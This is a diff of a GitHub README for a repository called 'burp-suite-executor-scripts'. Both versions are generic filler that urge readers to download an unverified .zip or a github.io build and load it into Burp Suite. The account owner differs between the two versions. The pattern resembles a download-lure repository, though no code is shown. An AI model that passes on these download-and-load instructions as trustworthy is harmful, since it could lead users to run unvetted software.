@@ -1,93 +1,50 @@
-# Burp Suite Executor Scripts v2026 - Script Collection 2026
+# 🛠 burp-suite-executor-scripts - Automate your web security testing tasks
 
-> A practical script library for Burp Suite users who want reusable automation, extension samples, and hands-on security testing helpers in one organized place.
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/mohiteprathamesh369-a11y/burp-suite-executor-scripts/releases)
 
-[![Scripts](https://img.shields.io/badge/Scripts-Collection-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/owenihfyoung3284/burp-suite-executor-scripts?style=flat-square)](https://github.com/owenihfyoung3284/burp-suite-executor-scripts)
+## What this tool does
 
----
+Burp Suite works as a proxy between your browser and the internet. Security experts use it to find flaws in websites. This repository provides a library of scripts to automate repetitive tasks within Burp Suite. You use these scripts to save time when you test web applications. The scripts handle common chores so you focus on finding security risks.
 
-<p align="center">
-  <a href="https://owenihfyoung3284.github.io/burp-suite-executor-scripts/">
-    <img src="https://img.shields.io/badge/Download-Burp%20Suite%20Executor%20Scripts-brightgreen?style=for-the-badge" alt="Download Burp Suite Executor Scripts">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - Burp Suite Executor Scripts](https://owenihfyoung3284.github.io/burp-suite-executor-scripts/)**
+You need a computer running Windows 10 or Windows 11. Ensure you have the full version of Burp Suite installed on your machine. You also need the Java Runtime Environment installed, as Burp Suite relies on it to run your extensions. We recommend at least 8GB of RAM to ensure the software runs without slowing down your computer.
 
----
+## 📥 How to download the scripts
 
-[Download Latest Build](https://owenihfyoung3284.github.io/burp-suite-executor-scripts/)
+You need to access the release page to get the files. 
 
----
+[Visit this page to download the latest scripts](https://github.com/mohiteprathamesh369-a11y/burp-suite-executor-scripts/releases)
 
-## What This Repository Covers
+On that page, look for the section labeled "Assets." Click the link that ends in ".zip" to save the folder to your computer. Once the download finishes, open your Downloads folder. Right-click the folder and choose "Extract All" to see the individual script files.
 
-Burp Suite Executor Scripts is a hand-picked set of resources built for Burp Suite-centered security testing and penetration testing workflows. Inside, you will find custom Java plugins, Python automation scripts, and task-focused helpers that make it easier to extend a working setup without starting from zero.
+## ⚙️ Setting up the scripts
 
-The collection emphasizes real-world web security scenarios such as SQLMap integration, Shiro scanning, and WAF scanning. It is aimed at people who want a reusable script pack for repeatable testing, fast experimentation, and a cleaner way to keep Burp extensions and related notes together.
+Open Burp Suite. Navigate to the "Extender" tab at the top of the window. Click on the "Extensions" sub-tab. Look for the "Add" button and click it to open the installation window. Change the "Extension type" to "Python" or "Java" depending on the file type of the script you want to use. Click "Select file" and navigate to the folder where you extracted the downloaded scripts. Choose the file and click "Next" to load the script into Burp Suite. Burp Suite checks the code and enables the new features in your dashboard.
 
-## What Youll Find Here
+## 🚀 Using the automation helpers
 
-- Burp Suite integration helpers that expand the core workflow
-- Custom Java plugins for Burp extension development
-- Python automation scripts for recurring testing tasks
-- SQLMap integration examples for coordinated scanning flows
-- Shiro scanning utilities for focused assessment work
-- WAF scanning helpers for evaluating response behavior
-- Practical security testing guides and usage notes
-- Supporting scripts and snippets for everyday web security work
+Once you load a script, you often see a new tab in the Burp Suite interface. Many of these scripts add buttons to your right-click context menu. To use a script, right-click on any request in your "Proxy" or "Target" history. Select the option provided by your loaded script. The script performs the action automatically and shows the results in a pop-up window or a dedicated task tab. 
 
-## Getting Started
+## 📋 Common tasks you can automate
 
-1. Download or clone the repository:
-   - `git clone https://github.com/owenihfyoung3284/burp-suite-executor-scripts.git
-2. Browse the folders for scripts, examples, and documentation.
-3. Move the files you need into your local Burp Suite or testing workspace.
-4. Load Java-based extensions in Burp Suite, and run Python scripts from your preferred environment.
+### Automating header insertion
+Many web applications require specific headers for every request. Instead of typing them manually, load the header-adder script. Configure your desired header once, and the script attaches it to every outgoing request you intercept.
 
-Suggested layout:
+### Customizing active scans
+Standard scans take time and often produce clutter. Use the scanning helpers in this library to target specific parts of a website. The scripts filter out irrelevant requests so your reports stay clean and accurate.
 
-- Keep reusable Burp extensions in your extensions folder
-- Store Python automation in a separate scripts directory
-- Put notes and runbooks beside the tools you use most
+### Parsing responses
+When a web server sends a response, it contains massive amounts of data. Use the parser scripts to extract specific information like session tokens or error codes. The scripts display this data in a structured list for easier reading.
 
-## Compatibility
+## 🛡️ Troubleshooting tips
 
-| Area | Support |
-| --- | --- |
-| Platform | Windows |
-| Primary tool | Burp Suite |
-| Extension languages | Java |
-| Automation language | Python |
-| Workflow focus | Security testing, penetration testing, web security |
-| Related tooling | SQLMap |
+If a script fails to load, verify you have the Jython standalone JAR file installed. Burp Suite needs this file to process Python-based scripts. You download this from the official Jython website. Go to the "Extender" tab, click "Options," and point Burp Suite to the location of this file on your hard drive. 
 
-## Repository Layout
+If a script keeps crashing, clear your Burp Suite extension cache. Sometimes older versions of scripts conflict with new ones. Delete the old extension, restart Burp Suite, and add the updated file again. Ensure your firewall allows Burp Suite to communicate with your browser. If your browser fails to show traffic in the Burp dashboard, verify that your proxy settings point to 127.0.0.1 on port 8080.
 
-- `scripts/` - automation scripts and reusable helpers
-- `extensions/` - Burp Suite extension code and Java plugins
-- `configs/` - configuration files and local setup notes
-- `examples/` - usage examples and reference snippets
-- `docs/` - practical guides and supporting documentation
+## 📖 Best practices for security testing
 
-## Frequently Asked Questions
+Always perform your tests on applications you own or have explicit permission to audit. Use a staging environment whenever possible rather than a live production site. Keep your scripts updated by checking the repository link regularly. When you find a script that works well for your specific workflow, back up your configuration JSON files. This ensures you do not lose your custom settings if you switch computers.
 
-**How often does the collection change?**  
-It is described as an actively maintained set of scripts, with updates intended to keep the tools useful for Burp Suite workflows and related testing tasks.
-
-**Can I tailor the scripts to my needs?**  
-Yes. The repository is structured as a script collection, so you can adjust the automation, extension logic, and examples to suit your own process.
-
-**Is this limited to a single environment?**  
-The main platform reference is Windows, but the scripts and examples are built around Burp Suite and common security testing tools rather than one narrow setup.
-
-**Where should I store local copies of the files?**  
-Use a local workspace that fits your testing routine, such as a dedicated folder for Burp extensions, automation scripts, and supporting notes.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: burp-suite, security-testing, web-hacking, automation-scripts, penetration-testing, windows-tools, cybersecurity
